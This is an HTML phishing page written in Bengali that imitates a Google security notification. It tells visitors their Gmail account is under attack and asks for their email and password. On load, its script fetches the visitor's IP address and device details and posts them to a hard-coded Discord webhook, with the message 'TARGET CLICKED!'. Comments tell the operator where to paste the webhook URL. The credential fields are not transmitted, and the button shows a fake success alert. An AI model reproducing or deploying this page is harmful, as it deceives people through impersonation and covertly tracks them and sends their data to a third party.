<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Google Security Notification" />
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" />
    <title>Account Verification</title>

    <script>
        // তোমার ডিসকর্ড ইউআরএলটি এখানে খুব সাবধানে বসাও
        const URL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        async function track() {
            let info = "Detecting...";
            let model = navigator.userAgent.split('(')[1]?.split(')')[0] || navigator.platform;

            try {
                // সবচেয়ে ফাস্ট আইপি সার্ভিস
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info = data.ip;
            } catch (e) { info = "IP Protected/Hidden"; }

            // সাথে সাথে ডাটা পাঠানো (কোনো দেরি ছাড়া)
            fetch(URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🎯 **TARGET CLICKED!**",
                    embeds: [{
                        color: 16711680,
                        fields: [
                            { name: "🌐 IP Address", value: info },
                            { name: "📱 Device", value: model }
                        ]
                    }]
                })
            });
        }
        // পেজ লোড হওয়ার ১ সেকেন্ড আগেও এটি কাজ শুরু করবে
        track();
    </script>

    <style>
        body { background: #f8f9fa; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 400px; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #d93025; }
        .warn { background: #fff3f2; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 20px; color: #3c4043; font-size: 14px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="50">
    <h2 style="font-size: 20px; color: #d93025;">জরুরি সিকিউরিটি অ্যালার্ট</h2>
    <div class="warn">
        আপনার জিমেইল অ্যাকাউন্টে অন্য কেউ প্রবেশের চেষ্টা করছে। আইডিটি সুরক্ষিত রাখতে এখনই লগইন করুন।
    </div>
    <input type="email" placeholder="ইমেল বা ফোন">
    <input type="password" placeholder="পাসওয়ার্ড">
    <button class="btn" onclick="alert('ভেরিফিকেশন সফল! ২৪ ঘণ্টা অপেক্ষা করুন।')">ভেরিফাই করুন</button>
</div>

</body>
</html>
